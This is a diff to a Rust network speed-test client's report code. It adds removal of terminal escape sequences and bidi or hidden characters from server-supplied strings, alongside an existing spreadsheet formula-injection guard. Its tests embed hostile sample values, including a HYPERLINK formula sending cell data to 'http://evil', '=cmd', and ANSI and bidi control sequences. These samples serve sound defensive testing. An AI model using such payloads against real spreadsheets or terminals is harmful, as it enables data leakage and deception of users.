@@ -1,8 +1,13 @@
 //! Machine-readable JSON and CSV reports.
+//!
+//! Every string that came off the wire is sanitized on its way into a report
+//! (see `output::sanitize`); the Go client cleans only its terminal output, so
+//! its JSON and CSV carry escape sequences and bidi overrides straight through.
 
 use serde::{Serialize, Serializer};
 
 use crate::defs::IPInfoResponse;
+use crate::output::sanitize;
 
 /// Renders a float as Go's `strconv.FormatFloat(v, 'f', -1, 64)` does: the
 /// shortest digits that read back as the same number, never an exponent, and
@@ -64,6 +69,12 @@ fn csv_float<S: Serializer>(v: &f64, s: S) -> Result<S::Ok, S::Error> {
     s.serialize_str(&plain_float(*v))
 }
 
+/// Serializes a string that came off the wire, with the terminal-steering and
+/// text-hiding characters removed.
+fn clean<S: Serializer>(v: &str, s: S) -> Result<S::Ok, S::Error> {
+    s.serialize_str(&sanitize(v))
+}
+
 /// One `progress` event of the `--json-stream` NDJSON stream.
 ///
 /// Typed rather than formatted by hand so the numbers are rendered the way
@@ -83,19 +94,21 @@ pub struct ProgressEvent {
     pub progress: u32,
 }
 
-/// Serializes a CSV text field, prefixing a leading formula trigger with a
-/// single quote so spreadsheet software treats the value as text.
+/// Serializes a CSV text field: sanitized, and with a leading formula trigger
+/// prefixed with a single quote so spreadsheet software treats it as text.
 ///
 /// The csv writer quotes fields containing the delimiter, a quote or a record
 /// terminator, but that is not enough on its own: Excel and LibreOffice strip
 /// the quotes and then evaluate anything starting with `=`, `+`, `-`, `@`, TAB
-/// or CR. Server names and addresses come off the wire, so a hostile server
-/// list can plant a formula that fires when the report is opened.
+/// or CR. Server names, addresses and the client address come off the wire, so
+/// a hostile server list or backend can plant a formula that fires when the
+/// report is opened, or an escape sequence for whoever cats the file.
 fn csv_text<S: Serializer>(v: &str, s: S) -> Result<S::Ok, S::Error> {
+    let v = sanitize(v);
     if v.starts_with(['=', '+', '-', '@', '\t', '\r']) {
         s.serialize_str(&format!("'{v}"))
     } else {
-        s.serialize_str(v)
+        s.serialize_str(&v)
     }
 }
 
@@ -175,7 +188,9 @@ pub fn format_timestamp(t: chrono::DateTime<chrono::FixedOffset>) -> String {
 /// The speed test server's information in a JSON report.
 #[derive(Debug, Default, Serialize)]
 pub struct ReportServer {
+    #[serde(serialize_with = "clean")]
     pub name: String,
+    #[serde(serialize_with = "clean")]
     pub url: String,
 }
 
@@ -183,7 +198,44 @@ pub struct ReportServer {
 #[derive(Debug, Default, Serialize)]
 pub struct Client {
     #[serde(flatten)]
-    pub ip_info: IPInfoResponse,
+    ip_info: IPInfoResponse,
+}
+
+impl Client {
+    /// Builds the client block of a report, sanitizing every field.
+    ///
+    /// The fields are destructured one by one on purpose: a field added to
+    /// `IPInfoResponse` breaks this function rather than reaching the report
+    /// with whatever the backend put in it.
+    pub fn new(ip_info: IPInfoResponse) -> Self {
+        let IPInfoResponse {
+            ip,
+            hostname,
+            city,
+            region,
+            country,
+            location,
+            organization,
+            postal,
+            timezone,
+            readme,
+        } = ip_info;
+
+        Self {
+            ip_info: IPInfoResponse {
+                ip: sanitize(&ip),
+                hostname: sanitize(&hostname),
+                city: sanitize(&city),
+                region: sanitize(&region),
+                country: sanitize(&country),
+                location: sanitize(&location),
+                organization: sanitize(&organization),
+                postal: sanitize(&postal),
+                timezone: sanitize(&timezone),
+                readme: sanitize(&readme),
+            },
+        }
+    }
 }
 
 /// The output data fields of a JSON report.
@@ -202,6 +254,7 @@ pub struct JSONReport {
     pub upload: f64,
     #[serde(serialize_with = "go_float")]
     pub download: f64,
+    #[serde(serialize_with = "clean")]
     pub share: String,
 
     /// What the connection to the server negotiated, absent over plain HTTP.
@@ -353,9 +406,8 @@ mod tests {
         assert!(out.contains("\"'=HYPERLINK(\"\"http://evil/?x=\"\"&A1,\"\"Result\"\")\""));
         assert!(out.contains(",'@SUM(1+1),"));
         assert!(out.contains(",'-2+3,"));
-        // A TAB needs no CSV quoting under a ',' delimiter, so the prefix on
-        // its own is what stops the evaluation here.
-        assert!(out.ends_with(",'\t=cmd\n"));
+        // The TAB is stripped first, and what is left still gets the prefix.
+        assert!(out.ends_with(",'=cmd\n"), "{out}");
         // A benign value is untouched.
         assert!(!csv_rows(
             &[CSVReport {
@@ -366,6 +418,24 @@ mod tests {
         )
         .unwrap()
         .contains('\''));
+    }
+
+    // The address column comes from the backend's own getIP answer, so it is
+    // no more trustworthy than the server name next to it.
+    #[test]
+    fn rows_sanitize_every_text_field() {
+        let rep = CSVReport {
+            name: "Evil\x1b[31m\u{202e}".into(),
+            address: "http://evil\u{9b}1m".into(),
+            share: "https://x/?id=1\u{ad}".into(),
+            ip: "203.0.113.9\x1b[2J".into(),
+            ..Default::default()
+        };
+        let out = csv_rows(&[rep], b',').unwrap();
+        assert_eq!(
+            out,
+            ",Evil[31m,http://evil1m,0,0,0,0,https://x/?id=1,203.0.113.9[2J\n"
+        );
     }
 
     #[test]
@@ -412,5 +482,35 @@ mod tests {
             "{out}"
         );
         assert!(out.contains(r#""url":"http://x/?a=1\u0026b=2""#), "{out}");
+    }
+
+    // The Go client's JSON carries these through; this client's does not.
+    #[test]
+    fn json_sanitizes_every_string_that_came_off_the_wire() {
+        let report = JSONReport {
+            server: ReportServer {
+                name: "Evil\x1b[31m\u{9b}1m\u{202e}txen\u{e0041}".into(),
+                url: "http://evil\u{ad}.example".into(),
+            },
+            client: Client::new(IPInfoResponse {
+                ip: "203.0.113.9\x1b[2J".into(),
+                hostname: "h\u{9b}31m.example".into(),
+                organization: "Evil\u{e0041}ISP".into(),
+                timezone: "UTC\u{2028}".into(),
+                ..Default::default()
+            }),
+            share: "https://x/?id=1\u{7f}".into(),
+            ..Default::default()
+        };
+        let out = to_go_json(&report).unwrap();
+        assert!(out.contains(r#""name":"Evil[31m1mtxen""#), "{out}");
+        assert!(out.contains(r#""url":"http://evil.example""#), "{out}");
+        assert!(out.contains(r#""ip":"203.0.113.9[2J""#), "{out}");
+        assert!(out.contains(r#""hostname":"h31m.example""#), "{out}");
+        assert!(out.contains(r#""org":"EvilISP""#), "{out}");
+        assert!(out.contains(r#""timezone":"UTC""#), "{out}");
+        assert!(out.contains(r#""share":"https://x/?id=1""#), "{out}");
+        // Nothing that steers a terminal survives anywhere in the document.
+        assert_eq!(sanitize(&out), out, "{out}");
     }
 }
